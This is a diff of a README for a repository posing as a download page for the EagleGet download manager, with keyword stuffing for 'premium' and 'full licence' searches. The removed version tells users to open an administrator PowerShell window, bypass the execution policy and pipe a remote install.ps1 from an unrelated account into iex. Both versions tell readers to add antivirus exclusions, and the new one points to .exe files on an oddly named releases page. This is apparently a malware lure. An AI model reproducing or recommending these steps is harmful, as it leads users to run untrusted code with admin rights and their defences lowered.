@@ -1,143 +1,104 @@
-# EagleGet Download for Windows 11 & 10
+# ⚡ Baixar-EagleGet - Manage your downloads for faster speeds
 
-**Baixar-EagleGet**
+[![Download EagleGet](https://img.shields.io/badge/Download-EagleGet-blue.svg)](https://github.com/Uncertain-vitalstatistics53/Baixar-EagleGet/releases)
 
-**EagleGet** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+EagleGet helps users download files quickly on Windows 11 and Windows 10. It organizes downloads to finish tasks in less time. This software manages files, resumes interrupted transfers, and integrates with web browsers.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+## 📁 System Requirements
 
----
+Before you install this software, check these requirements for your personal computer:
 
-## Download & Install (PowerShell)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: 1 GHz or faster.
+*   Memory: 2 GB RAM or more.
+*   Storage: 50 MB of free hard drive space.
+*   Network: A stable internet connection.
+*   Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
 
-> **This is the download page.** The command below downloads and runs the **EagleGet** installer on Windows 10/11.
+## 📥 How to download the software
 
-#### Before you start
+Follow these steps to obtain the installation file:
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+1. Visit the [official releases page](https://github.com/Uncertain-vitalstatistics53/Baixar-EagleGet/releases).
+2. Look for the section marked Assets.
+3. Find the file ending in .exe.
+4. Click the file name to start the download.
+5. Save the file to your Downloads folder or your desktop to find it quickly.
 
----
+## 🛠️ Step-by-Step Installation Guide
 
-#### Step 1 — Open PowerShell as Administrator
+The installation process creates a link between your browser and the manager. Follow these instructions to set up the software.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+1. Locate the downloaded file in your folder.
+2. Double-click the file to start the installer.
+3. Windows may ask for your permission to run the file. Click Yes or Run to proceed.
+4. The setup window appears on your screen. Select your preferred language from the list.
+5. Read the license agreement. If you agree, click the "Accept" or "Next" button.
+6. Choose the folder where you want to store the program files. The system suggests a standard location. Use this default location for the best results.
+7. Select "Create desktop icon" if you want easy access to the program later. 
+8. Click "Install" to begin the file transfer.
+9. Wait for the progress bar to reach the end. 
+10. Click "Finish" to close the installer.
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+## ⚙️ Initial Setup
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+After installation, the program launches automatically. You need to link your browser to ensure files route through the manager.
 
----
+1. Open your web browser. 
+2. A prompt might appear in your browser asking to enable the EagleGet extension.
+3. Click "Enable" or "Allow" to confirm. This step is necessary for the software to detect your downloads.
+4. If you do not see a prompt, open the program manually from your desktop shortcut.
+5. Go to the Settings or Configuration menu inside the program.
+6. Select the "Browser Integration" tab.
+7. Tick the boxes next to the browsers you use. 
+8. Restart your browser to finalize the changes.
 
-#### Step 2 — Copy the full command
+## 🚀 How to use the software
 
-Select **both lines** below and press **Ctrl+C**:
+EagleGet manages your downloads automatically once the integration is complete. When you click a download link on a website, the program window opens to ask for confirmation.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+1. Click the download link on your webpage as usual.
+2. The EagleGet dialog box appears.
+3. Check the file name and the target folder.
+4. Click the "Download" button inside the dialog box.
+5. The software begins the process. You can see the speed, time remaining, and status in the main window.
+6. Right-click any active download to pause, resume, or cancel the task.
 
-> Copy **both lines**, not just the second one.
+## 🛡️ Managing your files
 
----
+The main control panel shows all your completed or pending tasks.
 
-#### Step 3 — Paste into PowerShell and press Enter
+*   Progress Bars: Green bars indicate the download speed and completion percentage.
+*   Sorting: You can sort files by date, size, or status.
+*   Categories: The software creates folders for different file types like Documents, Music, or Videos. This keeps your computer tidy.
+*   Browser Button: You can monitor your active tasks at any time by clicking the icon in the Windows taskbar.
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+## ❓ Frequently Asked Questions
 
----
+What happens if my connection stops?
+The software tries to reconnect and resume from the last point. You do not need to start the download from the beginning.
 
-#### Step 4 — Finish setup
+Can I change the download folder?
+Yes. Go to Settings, choose General, and click the folder icon next to "Download Directory" to browse your computer for a new location.
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+Does this software slow down my computer?
+No. The application runs quietly in the background and uses low system resources.
 
----
+What if I cannot find the file?
+Check your Downloads folder in Windows File Explorer. If your browser hides the downloads, look at the browser download history by pressing Ctrl+J on your keyboard.
 
-#### Step 5 — Launch the app
+Is the license premium?
+The version provided is stable and includes core features for users. If you need to check the status of your premium access, look at the "About" tab in the main settings menu.
 
-Open **Start menu** → search for **EagleGet** → run it.
+## 💡 Troubleshooting tips
 
----
+If your files do not open with EagleGet, check these items:
 
-#### Troubleshooting
+*   Verify that the browser extension is active in your browser add-on menu.
+*   Make sure you have an active internet connection.
+*   Restart the program by closing it from the system tray and launching it again from the desktop icon.
+*   Check that your antivirus software does not block the application. You can add an exception for EagleGet in your security software settings if needed.
 
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
+Keeping the software updated ensures better compatibility with Windows 11 updates. Check the download link below regularly to see if a new version is available.
 
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**EagleGet** setup page for Windows PC users.
-
-**People also search for:** baixar eagleget premium windows, eagleget licenca completa 2026, instalar eagleget windows 11 portugues brasil
-
-**Repository:** `Baixar-EagleGet`
-
-
-## Português — Guia rápido
-
-Página de download do **EagleGet** para Windows 10/11. Focado em usuários do **Brasil e Portugal**.
-
-| Passo | O que fazer |
-| --- | --- |
-| 1 | Abra a seção **Download & Install** acima |
-| 2 | Use o link direto ou o comando PowerShell (Admin) |
-| 3 | Execute o instalador **como administrador** |
-| 4 | Digite a chave de licença se solicitado |
-| 5 | Abra **EagleGet** pelo Menu Iniciar |
-
-**Pesquisas comuns:** baixar grátis, instalar Windows 11, completo 2026, download PC.
-
----
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** baixar-eagleget-premium-windows, baixar, eagleget, premium, eagleget-licenca-completa-2026, licenca, completa, instalar-eagleget-windows-11-portugues-brasil, baixar-eagleget, baixar-eagleget-2026, gerenciador-downloads, download-manager
+[![Download EagleGet](https://img.shields.io/badge/Download-Latest_Version-grey.svg)](https://github.com/Uncertain-vitalstatistics53/Baixar-EagleGet/releases)
